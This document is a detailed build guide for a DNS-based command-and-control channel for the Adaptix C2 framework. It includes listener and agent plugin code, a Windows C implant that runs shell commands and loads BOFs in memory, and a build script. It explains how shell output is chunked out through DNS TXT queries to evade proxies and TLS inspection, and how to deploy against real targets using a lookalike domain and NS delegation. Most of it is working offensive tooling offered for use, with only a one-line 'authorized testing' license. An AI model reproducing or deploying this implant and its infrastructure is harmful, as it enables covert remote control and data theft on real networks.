# DNS C2 Channel for Adaptix C2
 
**Platform:** Kali Linux / Windows x64

---

## Overview

A complete implementation of a DNS-based C2 channel integrated into Adaptix C2 v1.2.0. DNS traffic is almost universally permitted outbound — even in environments with strict HTTP/S proxies, application-aware firewalls, and TLS inspection, UDP 53 quietly flows through. This stack tunnels its entire C2 channel inside DNS TXT record exchanges.

Built and tested on Kali Linux against a Windows 10 VM on a VMware host-only network.

---

## Architecture

```
┌─────────────────────┐         DNS TXT (UDP)          ┌──────────────────────────┐
│  dns_agent.exe      │ ─────────────────────────────► │  Kali: BeaconDNS :5300   │
│  Windows x64 C      │ ◄───────────────────────────── │  Go .so plugin           │
│  implant            │      TXT record response        └────────────┬─────────────┘
│                     │                                              │
│  Raw UDP only       │                                              ▼
│  Bypasses OS DNS    │                                 ┌──────────────────────────┐
│  resolver entirely  │                                 │  dns_agent.so            │
└─────────────────────┘                                 │  Go .so plugin           │
                                                        │  (agent handler)         │
                                                        └────────────┬─────────────┘
                                                                     │
                                                                     ▼
                                                        ┌──────────────────────────┐
                                                        │  Adaptix Teamserver      │
                                                        │  GUI / Operator Console  │
                                                        └──────────────────────────┘
```

### Components

| Component | Type | Role |
|---|---|---|
| `BeaconDNS.so` | Go plugin (`adaptix.PluginListener`) | Runs UDP/TCP DNS server, decodes TXT queries, routes to teamserver API |
| `dns_agent.so` | Go plugin (`adaptix.PluginAgent`) | Handles agent registration, task serialization, output processing |
| `dns_agent.exe` | Windows x64 C implant | Raw UDP DNS queries, shell execution, BOF loading |

The implant bypasses the Windows DNS resolver entirely. No `DnsQuery` API call, no system stub resolver. It builds a valid DNS packet, stuffs it into a UDP socket, and sends it directly to the operator-specified IP and port.

---

## Part 1: Adaptix Plugin System

### Plugin Load Sequence

The server reads `profile.yaml` at startup:

```yaml
extenders:
  - "extenders/BeaconDNS/config.yaml"
  - "extenders/dns_agent/config.yaml"
```

**Listener load path:**
1. Parse `config.yaml` → find `.so` and `.axs` paths
2. `plugin.Open("BeaconDNS.so")`
3. Look up exported symbol `InitPlugin`
4. Call `InitPlugin(ts, moduleDir, listenerDir)` → returns `adaptix.PluginListener`
5. Read and execute `ax_config.axs` (GUI form definition)
6. Call `TsListenerReg(listenerInfo)` → `DNSC2` appears in GUI dropdown

**Agent load path:**
1. Parse `config.yaml` → includes watermark (unique 8-hex-char ID)
2. Read and execute `ax_config.axs` (right-click menu commands)
3. `plugin.Open("dns_agent.so")`
4. Call `InitPlugin(ts, moduleDir, watermark)` → returns `adaptix.PluginAgent`
5. Call `TsAgentReg(agentInfo)`

### Interface Requirements

```go
// Listener entry point — exact name required
func InitPlugin(ts any, moduleDir string, listenerDir string) adaptix.PluginListener

type PluginListener interface {
    Create(name, config string, customData []byte) (ExtenderListener, ListenerData, []byte, error)
}

type ExtenderListener interface {
    Start() error
    Stop() error
    Edit(config string) (ListenerData, []byte, error)
    GetProfile() ([]byte, error)
    InternalHandler(data []byte) (string, error)
}
```

```go
// Agent entry point
func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent

type PluginAgent interface {
    GenerateProfiles(profile BuildProfile) ([][]byte, error)
    BuildPayload(profile BuildProfile, agentProfiles [][]byte) ([]byte, string, error)
    GetExtender() ExtenderAgent
    CreateAgent(beat []byte) (AgentData, ExtenderAgent, error)
}

type ExtenderAgent interface {
    Encrypt(data []byte, key []byte) ([]byte, error)
    Decrypt(data []byte, key []byte) ([]byte, error)
    PackTasks(agentData AgentData, tasks []TaskData) ([]byte, error)
    CreateCommand(agentData AgentData, args map[string]any) (TaskData, ConsoleMessageData, error)
    ProcessData(agentData AgentData, decryptedData []byte) error
}
```

Every method must be implemented even if it does nothing.

### The Go Plugin Build ID Problem

> **This is the most important technical constraint and the first major failure point.**

Go's `plugin` package requires that every package imported by both the server binary and the plugin has identical **build IDs**. Build IDs are hashes of: package source, compiler flags, and build IDs of all imported packages — chaining down to stdlib.

The Adaptix repo ships a pre-compiled `server-dist/adaptixserver` built inside Docker (`FROM golang:1.25-bookworm`). Any plugin compiled locally — even at the same Go version — will have different stdlib build IDs. Result:

```
failed to open plugin BeaconDNS.so: plugin was built with a different version of package golang.org/x/sys/unix
failed to open plugin dns_agent.so: plugin was built with a different version of package github.com/Adaptix-Framework/axc2
```

**Fix:** Never use the pre-compiled server binary. Compile both the server and all plugins together in a single invocation using your local toolchain:

```bash
cd /home/kali/AdaptixC2
make server-ext
```

Then replace all binaries:

```bash
sudo cp dist/adaptixserver AdaptixServer/server-dist/adaptixserver
sudo cp -r dist/extenders/* AdaptixServer/server-dist/extenders/
```

You must replace ALL extender `.so` files when you rebuild the server. A plugin from a previous `make server-ext` run is not compatible with a server binary from a new run.

### go.work Workspace

The repo uses a Go workspace (`AdaptixServer/go.work`):

```
go 1.25.4

use .
use ./extenders/BeaconDNS
use ./extenders/dns_agent
use ./extenders/beacon_agent
```

Adding new extenders requires a `use` line here. Without it the extender builds in isolation and immediately fails the build ID check.

### GOEXPERIMENT

Adaptix v1.2.0 requires:

```
GOEXPERIMENT=jsonv2,greenteagc
```

Must be present on every `go build` invocation — server binary and every plugin. The root `Makefile` sets this automatically.

---

## Part 2: AxScript GUI System

AxScript defines operator GUI forms. Two function types in each `.axs` file:

- **`RegisterCommands(listenerType)`** — called once at load. Returns command groups that become right-click menu entries.
- **`GenerateUI(listeners_type)`** — called when an operator opens a payload generation dialog.

v1.2.0 uses a fluent builder pattern. **The API changed from prior versions and is undocumented.**

```javascript
// WRONG
ax.create_command("shell", "description", [
    ax.create_arg("cmd", "string", true, "", "Command to execute")
]);

// CORRECT
let cmd = ax.create_command("shell", "Execute shell command", "shell whoami", "Task: execute shell command");
cmd.addArgString("cmd", true);
```

```javascript
// WRONG
form.create_lineedit("hostname", "5000")
form.create_combobox("arch", ["x64", "x86"])

// CORRECT
let textSleep = form.create_textline("5000");
let comboArch = form.create_combo();
comboArch.addItems(["x64", "x86"]);
```

Failures here are silent: the server logs `TypeError: Object has no member 'create_arg'` and skips commands, but the plugin still loads. The agent appears in Sessions with no right-click menu. The correct API was reverse-engineered from `beacon_agent/ax_config.axs`.

---

## Part 3: DNS Protocol Design

### Transport Constraints

A DNS FQDN is max 253 characters, labels max 63 each. Usable uplink capacity per query:

```
253 - len(".c2.lab.") - len(".agentid.") ≈ 235 base32 chars ≈ 146 bytes raw
```

After encryption overhead: ~100–120 bytes per query across up to 3 labels of 63 chars. Large output must be chunked across multiple queries with sequence numbers.

### Encoding

**Uplink (agent → server):**
1. Frame with 4-byte header (`msg_type`, `seq`, `data_len` LE)
2. XOR-encrypt with key derived from agent ID
3. Base32-encode (standard alphabet, no padding) → DNS-safe ASCII labels

**Downlink (server → agent via TXT record):**
1. Frame with 3-byte header (`resp_type`, `data_len`)
2. XOR-encrypt with same key
3. Base32-encode → TXT record value

XOR key derivation: agent ID `"deadc0de"` → key `[0xde, 0xad, 0xc0, 0xde]`. Obfuscation only — add AES-128-GCM for production opsec.

### Agent ID

8-character lowercase hex string hardcoded in the implant at compile time. Must be valid hex — `"dns00001"` fails silently because `n` and `s` are not hex digits. Use `"d0c00001"` or generate with:

```bash
python3 -c "import secrets; print(secrets.token_hex(4))"
```

### Message Types

**Upstream:**

| Type | Value | Payload |
|---|---|---|
| `MSG_REGISTER` | `0x01` | hostname, username, PID, arch, OS version, sleep |
| `MSG_HEARTBEAT` | `0x02` | empty |
| `MSG_OUTPUT` | `0x03` | chunked shell output |
| `MSG_BOF_OUT` | `0x04` | chunked BOF output |

**Downstream:**

| Type | Value | Payload |
|---|---|---|
| `RESP_IDLE` | `0x00` | nothing to do |
| `RESP_REG_ACK` | `0x01` | registration accepted |
| `RESP_TASKS` | `0x02` | serialized task queue |

### Registration Flow

`do_registration()` loops until `RESP_REG_ACK`:

1. Build `MSG_REGISTER` packet (hostname, username, PID, arch, OS major/minor, sleep, jitter)
2. Encrypt + base32-encode
3. Send as DNS TXT query for `<data>.deadc0de.c2.lab`
4. Read TXT record response
5. Decode + decrypt → check `resp_type == RESP_REG_ACK`

Server calls `TsAgentCreate("d0c00001", "deadc0de", payload, "DNSC2", remoteIP, false)`. The `dns_agent` plugin's `CreateAgent` parses payload into `adaptix.AgentData` and the agent appears in the GUI.

### Main Loop

```c
while (1) {
    jittered_sleep();
    uint8_t resp[512];
    size_t resp_len = send_heartbeat(resp, sizeof(resp));
    if (resp_len > 0 && resp[0] == RESP_TASKS) {
        dispatch_tasks(resp + 3, resp_len - 3);
    }
}
```

Sleep jitter:

```
actual_sleep = SLEEP_MS + random(-(SLEEP_MS * JITTER_PCT / 100), +(SLEEP_MS * JITTER_PCT / 100))
```

### Chunked Output — The Critical Bug

Commands like `whoami` (22 bytes) worked immediately. `ipconfig` (300+ bytes) silently failed. Root cause: the server processed each DNS query individually. `seq=0` carried only the first 67 bytes; `TsAgentProcessData` got a truncated buffer. All `seq > 0` continuations were dropped.

**Fix:** Add stateful buffering to the DNS server:

```go
type outputBuf struct {
    taskID   string
    status   byte
    totalLen uint32
    data     []byte
}

type DNSServer struct {
    // ...
    outBuffers sync.Map // agentId → *outputBuf
}
```

`handleOutput` logic:
- `seq=0`: create `outputBuf`, store first chunk, check if already complete
- `seq>0`: append to existing buffer, check if complete
- When `len(data) >= totalLen`: call `flushOutput`

`flushOutput` rebuilds the wire format for `ProcessData`:

```go
result := make([]byte, 0, 13+len(output))
result = append(result, []byte(buf.taskID)...)
result = append(result, buf.status)
binary.LittleEndian.PutUint32(lenBytes[:], uint32(len(output)))
result = append(result, lenBytes[:]...)
result = append(result, output...)
Ts.TsAgentProcessData(agentId, result)
```

---

## Part 4: BeaconDNS Listener Plugin

### pl_main.go

Implements `InitPlugin` and `PluginListener` / `ExtenderListener`. `Create()` is called when the operator clicks Create in the GUI — parses JSON config (host, port, domain), instantiates `DNSServer`. `Start()` / `Stop()` launch and shut down the `miekg/dns` UDP and TCP servers.

### dns_server.go

`handleDNS` entry point for every query:
1. Validate query name ends with `.<domain>.`
2. Strip domain suffix → get data labels and agent ID
3. Validate agent ID (exactly 8 lowercase hex chars)
4. Derive XOR key from agent ID
5. Join + uppercase data labels → base32-decode
6. XOR-decrypt
7. Dispatch to `handleRegister`, `handleHeartbeat`, or `handleOutput`
8. XOR-encrypt response → base32-encode → TXT record value

### config.yaml

```yaml
extender_type: "listener"
extender_file: "BeaconDNS.so"
ax_file: "ax_config.axs"
listener_name: "DNSC2"
listener_type: "external"
protocol: "DNS"
```

`listener_name` must exactly match the string passed to `TsListenerReg`. A mismatch causes the listener to register but not appear in the GUI dropdown.

---

## Part 5: dns_agent Plugin

### commands.go

`CreateCommand` receives `map[string]any` args, returns `TaskData`.

Shell task wire format:
```
[0x01][0x00][len_lo][len_hi][cmd_bytes...]
```

BOF task wire format:
```
[0x02][...bof_len...][bof_bytes...][...args...]
```

`ProcessData` receives reassembled output buffer, extracts task ID, calls `TsTaskUpdate` to display output in the operator console.

### protocol.go

`PackTasks` serializes pending tasks:

```
[4 bytes] total_len
[8 bytes] task_id (ASCII hex)
[1 byte]  task_type
[4 bytes] data_len
[N bytes] data
...
```

### Watermark

`"d0c00001"` — 4-byte hex identifier, passed to `InitPlugin`, used by `TsAgentCreate` to route registrations to the correct agent plugin. Must be unique across all loaded agent plugins and exactly 8 lowercase hex characters.

---

## Part 6: Windows C Implant

### Raw DNS — dns.c

No Windows DNS API. Constructs DNS query packet by hand: 12-byte header + encoded QNAME + QTYPE (TXT=16) + QCLASS (IN=1).

```c
SOCKET sock = socket(AF_INET, SOCK_DGRAM, 0);
struct sockaddr_in server = {0};
server.sin_family = AF_INET;
server.sin_port = htons(C2_PORT);
inet_pton(AF_INET, C2_HOST, &server.sin_addr);
sendto(sock, packet, pkt_len, 0, (SOCKADDR*)&server, sizeof(server));
```

Response parsing skips the DNS header and question section, reads answer RDLENGTH, skips the TXT length prefix byte, reads raw base32 string directly.

### protocol.c

Base32 encode/decode from scratch using standard alphabet (`A-Z`, `2-7`). XOR:

```c
for (size_t i = 0; i < len; i++)
    data[i] ^= key[i % 4];
```

### Chunked Output — send_task_output

80-byte chunk size → 128 base32 chars → 3 labels of ~43 chars each, well under the 63-char label limit.

```c
#define OUTPUT_CHUNK 80

void send_task_output(const char *task_id, uint8_t status,
                       const uint8_t *data, uint32_t total_len) {
    uint32_t offset = 0;
    uint8_t seq = 0;

    while (offset < total_len || seq == 0) {
        uint8_t chunk[OUTPUT_CHUNK];
        uint32_t chunk_len = 0;

        if (seq == 0) {
            // First chunk: 13-byte header + data
            memcpy(chunk, task_id, 8);      // task_id
            chunk[8] = status;              // status byte
            *(uint32_t*)(chunk + 9) = total_len; // LE total length
            chunk_len = 13;
        }

        uint32_t data_bytes = OUTPUT_CHUNK - chunk_len;
        if (offset + data_bytes > total_len)
            data_bytes = total_len - offset;

        memcpy(chunk + chunk_len, data + offset, data_bytes);
        chunk_len += data_bytes;
        offset += data_bytes;

        send_dns_query(chunk, chunk_len, seq);
        seq++;
    }
}
```

### bof_loader.c — In-Process COFF Execution

Loads Cobalt Strike-compatible `.o` BOFs directly from memory without writing to disk:

1. Parse COFF header → section count + symbol table
2. `VirtualAlloc(MEM_COMMIT, PAGE_EXECUTE_READWRITE)` per section
3. Resolve relocations: `IMAGE_REL_AMD64_ADDR64` and `IMAGE_REL_AMD64_REL32`
4. Resolve external symbols via `GetProcAddress`
5. Call `go` entry point with `BeaconDataParse` args object

### beacon_api.c — CS Compatibility Shim

| Function | Purpose |
|---|---|
| `BeaconDataParse` / `BeaconDataExtract` / `BeaconDataInt` | Parse packed argument buffer |
| `BeaconPrintf` | Format output to internal buffer |
| `BeaconOutput` | Copy output to BOF result buffer |
| `BeaconIsAdmin` | Check token elevation via `OpenProcessToken` |

BOF output is returned via `send_task_output` with `msg_type = MSG_BOF_OUT`.

---

## Part 7: DNS Network Configuration

### The Three Ports

```
Port   53  — standard DNS (Windows DNS adapter, internet resolvers)
Port 5353  — dnsmasq (local forwarding resolver on Kali)
Port 5300  — Adaptix BeaconDNS listener (implant sends here)
```

### /etc/resolv.conf

```
nameserver 127.0.0.1
nameserver 8.8.8.8
```

`resolv.conf` doesn't support specifying a port — resolver always sends to port 53. For Kali's own queries to reach dnsmasq on 5353:

```bash
sudo iptables -t nat -A OUTPUT -p udp -d 127.0.0.1 --dport 53 -j REDIRECT --to-port 5353
```

### dnsmasq Config

```ini
listen-address=127.0.0.1,192.168.67.128
bind-interfaces
server=8.8.8.8
server=1.1.1.1
local=/c2.lab/
address=/ns1.c2.lab/192.168.67.128
address=/.c2.lab/192.168.67.128
port=5353
```

> **WARNING:** `local=/c2.lab/` combined with `address=/.c2.lab/...` answers every `*.c2.lab` query — including TXT — with an A record. The C2 protocol breaks entirely if Windows is routed through dnsmasq.

For DNS C2 forwarding through dnsmasq, replace those two lines with:

```ini
server=/c2.lab/127.0.0.1#5300
```

This makes dnsmasq a transparent relay: Windows TXT query → dnsmasq → Adaptix → response relayed back.

**In the current lab this doesn't matter** because the implant bypasses dnsmasq entirely.

### iptables PREROUTING

Windows VM sends to port 53; dnsmasq is on 5353:

```bash
sudo iptables -t nat -A PREROUTING -i ens33 -p udp --dport 53 -j REDIRECT --to-port 5353
sudo iptables -t nat -A PREROUTING -i ens33 -p tcp --dport 53 -j REDIRECT --to-port 5353
```

`PREROUTING` fires for packets arriving from outside the machine only — not loopback. That's why a separate `OUTPUT` chain rule is needed for Kali's own DNS.

Persist across reboots:

```bash
sudo apt install iptables-persistent
sudo netfilter-persistent save
```

### Traffic Flow Scenarios

**Scenario 1 — Lab (implant direct to port 5300):**

```
Windows dns_agent.exe
  │  Raw UDP → 192.168.67.128:5300  (bypasses all DNS infrastructure)
  ▼
Kali: Adaptix BeaconDNS :5300
  │  Parse → decode → dispatch
  ▼
TXT response → Windows processes tasks
```

**Scenario 2 — Through dnsmasq (requires fixing local=/c2.lab/ config):**

```
Windows DNS client
  │  UDP → 192.168.67.128:53
  ▼
iptables PREROUTING: 53 → 5353
  ▼
dnsmasq :5353
  │  *.c2.lab? → forward to 127.0.0.1:5300
  │  Anything else? → 8.8.8.8
  ▼
Adaptix BeaconDNS :5300
  ▼
dnsmasq relays response → Windows
```

**Scenario 3 — Real engagement (internet DNS delegation):**

```
Implant (C2_PORT=53, C2_HOST=VPS_IP)
  │  Raw UDP DNS TXT → VPS:53
  ▼
VPS iptables: 53 → 5300
  ▼
Adaptix BeaconDNS :5300
  ▼
TXT response → implant
```

NS delegation in public DNS routes `*.c2domain.com` through corporate resolvers without direct connectivity requirements:

```
ns1.c2domain.com.  A   <VPS_IP>
c2domain.com.      NS  ns1.c2domain.com.
```

---

## Part 8: Build Process

### Server + Plugins

```bash
cd /home/kali/AdaptixC2

# Fix ownership if dist/ was previously root-owned from Docker
sudo chown -R kali:kali /home/kali/AdaptixC2/dist

# Build everything together — the only correct way
make server-ext

# Deploy
sudo cp dist/adaptixserver AdaptixServer/server-dist/adaptixserver
sudo cp -r dist/extenders/BeaconDNS AdaptixServer/server-dist/extenders/
sudo cp -r dist/extenders/dns_agent AdaptixServer/server-dist/extenders/
```

The `gopher_agent` build failure is expected (requires Go 1.26 + `garble`). All other plugins build successfully.

### Script/Config-Only Changes

When only `.axs` or `.yaml` files change — no Go rebuild needed:

```bash
sudo cp AdaptixServer/extenders/dns_agent/ax_config.axs \
        AdaptixServer/server-dist/extenders/dns_agent/ax_config.axs
sudo pkill -f adaptixserver
cd AdaptixServer/server-dist && sudo ./adaptixserver -profile profile.yaml
```

### C Implant

Independent of the Go build system:

```bash
cd /home/kali/localtest/dns-c2/payload
# Edit include/config.h with IP/port/domain/AGENT_ID
x86_64-w64-mingw32-gcc -O2 -s -o dns_agent.exe \
  src/main.c src/dns.c src/protocol.c src/commands.c \
  src/shell.c src/bof_loader.c src/beacon_api.c \
  -Iinclude -lws2_32 -static
```

No server restart needed after rebuilding the implant.

---

## Part 9: Verification

### Clean Server Startup

```bash
cd /home/kali/AdaptixC2/AdaptixServer/server-dist
sudo ./adaptixserver -profile profile.yaml
```

Expected:

```
[===== Adaptix Framework v1.2 =====]

[-] failed to open plugin gopher_listener_tcp...  ← expected
[-] failed to open plugin gopher_agent...          ← expected
[+] Starting server -> https://0.0.0.0:4321/endpoint
[*] Restore data from Database...
[+] The AdaptixC2 server is ready
```

Any `[-]` mentioning `BeaconDNS` or `dns_agent` means a problem. Common causes:

| Symptom | Cause |
|---|---|
| Build ID mismatch error | Didn't run `make server-ext` or mixed `.so` from different builds |
| Plugin loads but no commands | AxScript API error — check `.axs` against `beacon_agent` reference |
| `DNSC2` not in GUI dropdown | `listener_name` mismatch between `config.yaml` and `TsListenerReg` call |
| Agent appears, silent reg failure | Invalid watermark — must be exactly 8 lowercase hex chars |

### Creating a Listener

1. Connect to `https://192.168.67.128:4321/endpoint`
2. Listeners → Create → select `DNSC2`
3. Set Host: `0.0.0.0`, Port: `5300`, Domain: `c2.lab`
4. Click Create

### Functional Tests

```
shell whoami      → single-chunk flow
shell ipconfig    → multi-chunk reassembly
shell systeminfo  → large output (300+ bytes), stress-tests chunking
```

### Traffic Verification

```bash
sudo tcpdump -i any -n udp port 5300 -vv
```

Each heartbeat = one inbound TXT query + one outbound TXT response. Task output = multiple rapid inbound packets (one per 80-byte chunk).

---

## Part 10: Engagement Deployment

### config.h Per Engagement

```c
#define C2_HOST    "your.vps.ip"
#define C2_PORT    53            // use 53 on real engagements
#define C2_DOMAIN  "cdn-updates.com"
#define AGENT_ID   "a3f9c142"   // unique per target
#define SLEEP_MS   60000
#define JITTER_PCT 25
```

Generate unique AGENT_ID:

```bash
python3 -c "import secrets; print(secrets.token_hex(4))"
```

### VPS DNS Setup

```bash
# Public DNS records
ns1.cdn-updates.com.  A    <VPS_IP>
cdn-updates.com.      NS   ns1.cdn-updates.com.

# iptables on VPS (if not binding :53 directly)
sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5300
sudo iptables -t nat -A PREROUTING -p tcp --dport 53 -j REDIRECT --to-port 5300
```

### Build Script

```bash
#!/bin/bash
C2_HOST=${1:?need C2_HOST}
C2_DOMAIN=${2:?need C2_DOMAIN}
AGENT_ID=${3:-$(python3 -c "import secrets; print(secrets.token_hex(4))")}
C2_PORT=${4:-53}
SLEEP_MS=${5:-60000}
JITTER_PCT=${6:-25}

cat > include/config.h <<EOF
#ifndef CONFIG_H
#define CONFIG_H
#define C2_HOST    "$C2_HOST"
#define C2_PORT    $C2_PORT
#define C2_DOMAIN  "$C2_DOMAIN"
#define AGENT_ID   "$AGENT_ID"
#define SLEEP_MS   $SLEEP_MS
#define JITTER_PCT $JITTER_PCT
#endif
EOF

x86_64-w64-mingw32-gcc -O2 -s -o dns_agent.exe \
  src/main.c src/dns.c src/protocol.c src/commands.c \
  src/shell.c src/bof_loader.c src/beacon_api.c \
  -Iinclude -lws2_32 -static

echo "[+] dns_agent.exe built (AGENT_ID=$AGENT_ID)"
```

```bash
./build.sh 203.0.113.10 cdn-updates.com a3f9c142 53 60000 25
```

---

## Key Lessons

| Problem | Root Cause | Fix |
|---|---|---|
| Go plugin build ID mismatch | Pre-compiled server binary has different stdlib build IDs | Always use `make server-ext` — compile server + all plugins together |
| Agent loads, no right-click commands | AxScript v1.2.0 API changed silently | Reference `beacon_agent/ax_config.axs` for correct method names |
| Large command output silently fails | Server had no buffer for multi-chunk reassembly | Added `sync.Map` output buffer in DNS server, flush on completion |
| Agent registration silently rejected | Invalid hex chars in watermark (`dns00001`) | Use valid 8-char hex watermark (`d0c00001`) |
| `DNSC2` missing from GUI dropdown | `listener_name` mismatch | Match `config.yaml` and `TsListenerReg` exactly |
| dnsmasq breaking TXT queries | `address=/.c2.lab/` answers TXT with A records | Replace with `server=/c2.lab/127.0.0.1#5300` for relay mode |

---

## License

For authorized penetration testing use only. 
